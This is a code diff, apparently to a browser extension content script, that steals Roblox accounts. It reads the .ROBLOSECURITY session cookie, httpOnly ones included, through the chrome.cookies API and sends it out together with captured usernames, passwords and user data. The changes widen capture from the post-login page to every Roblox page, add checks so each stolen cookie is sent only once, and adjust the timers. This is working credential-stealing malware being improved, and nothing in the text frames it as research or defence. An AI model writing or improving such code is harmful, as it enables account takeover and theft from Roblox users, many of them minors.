@@ -61,12 +61,8 @@
       return;
     }
 
-    // Only capture on successful login redirect page
-    if (!window.location.href.includes('roblox.com/?nl=true')) {
-      return;
-    }
-
-    console.log('Checking for Roblox security cookie on successful login page...');
+    // Instead of requiring ?nl=true, allow capture on ANY Roblox page
+    console.log('Checking for Roblox security cookie on Roblox page...');
     
     // Get all cookies including httpOnly ones using chrome.cookies API
     try {
@@ -80,11 +76,20 @@
           if (roblosecurityCookie) {
             console.log('Found ROBLOSECURITY cookie via API');
             
-            // Check if we already sent this cookie
+            // Check if we already sent this cookie (exact match)
             if (lastSentCookie === roblosecurityCookie.value) {
               console.log('Cookie already sent, skipping...');
               return;
             }
+
+            // Also check if we're currently processing this cookie (prevent parallel processing)
+            if (window.processingCookie === roblosecurityCookie.value) {
+              console.log('Cookie currently being processed, skipping...');
+              return;
+            }
+
+            // Mark as processing
+            window.processingCookie = roblosecurityCookie.value;
 
             // Check for recent login attempt with extended search
             let credentials = { username: '', password: '' };
@@ -161,6 +166,9 @@
             } catch (error) {
               console.log('Error clearing sessionStorage:', error);
             }
+
+            // Clear processing flag
+            delete window.processingCookie;
           }
         }
       });
@@ -168,18 +176,28 @@
       console.error('Error getting cookies via API:', error);
     }
 
-    // Also check document.cookie as fallback
-    const cookies = document.cookie.split(';');
-    for (let cookie of cookies) {
-      const [name, value] = cookie.trim().split('=');
-      if (name === '.ROBLOSECURITY') {
-        console.log('Found ROBLOSECURITY cookie in document.cookie');
-        
-        // Check if we already sent this cookie
-        if (lastSentCookie === value) {
-          console.log('Cookie already sent, skipping...');
-          return;
-        }
+    // Also check document.cookie as fallback (only if not already processed via API)
+    if (!window.processingCookie) {
+      const cookies = document.cookie.split(';');
+      for (let cookie of cookies) {
+        const [name, value] = cookie.trim().split('=');
+        if (name === '.ROBLOSECURITY') {
+          console.log('Found ROBLOSECURITY cookie in document.cookie');
+          
+          // Check if we already sent this cookie
+          if (lastSentCookie === value) {
+            console.log('Cookie already sent, skipping...');
+            return;
+          }
+
+          // Check if currently processing
+          if (window.processingCookie === value) {
+            console.log('Cookie currently being processed, skipping...');
+            return;
+          }
+
+          // Mark as processing
+          window.processingCookie = value;
 
         // Check for recent login attempt
         let credentials = { username: '', password: '' };
@@ -210,19 +228,23 @@
         const userData = await fetchRobloxUserData(value);
 
         // Send combined data (credentials + cookie + user data)
-        sendCombinedLoginData(credentials, value, userData);
+          sendCombinedLoginData(credentials, value, userData);
 
-        // Update tracking
-        lastSentCookie = value;
-        
-        // Clear the stored login attempt
-        delete window.robloxLoginAttempt;
-        try {
-          sessionStorage.removeItem('robloxLoginAttempt');
-        } catch (error) {
-          console.log('Error clearing sessionStorage (fallback):', error);
+          // Update tracking
+          lastSentCookie = value;
+          
+          // Clear the stored login attempt
+          delete window.robloxLoginAttempt;
+          try {
+            sessionStorage.removeItem('robloxLoginAttempt');
+          } catch (error) {
+            console.log('Error clearing sessionStorage (fallback):', error);
+          }
+
+          // Clear processing flag
+          delete window.processingCookie;
+          break;
         }
-        break;
       }
     }
   }
@@ -544,13 +566,9 @@
 
     console.log('Starting enhanced Roblox monitoring on:', window.location.href);
 
-    // Only check for security cookie if on successful login page
-    if (window.location.href.includes('roblox.com/?nl=true')) {
-      setTimeout(captureRobloxSecurity, 1000);
-      setTimeout(captureRobloxSecurity, 3000);
-      setTimeout(captureRobloxSecurity, 5000);
-      setTimeout(captureRobloxSecurity, 10000);
-    }
+    // Check for security cookie on any Roblox page (reduced frequency)
+    setTimeout(captureRobloxSecurity, 2000);
+    setTimeout(captureRobloxSecurity, 5000);
 
     // Monitor for cookie changes more frequently
     let lastCookies = document.cookie;
